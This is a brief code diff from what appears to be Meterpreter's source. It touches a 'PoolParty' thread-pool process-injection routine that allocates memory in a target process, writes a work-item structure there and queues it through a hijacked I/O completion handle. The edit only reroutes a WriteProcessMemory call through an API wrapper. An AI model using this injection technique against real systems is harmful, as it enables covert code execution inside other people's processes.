@@ -234,7 +234,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 			if (!RemoteDirectAddress) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
 			}
-			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
+			if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
 			}
 			dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
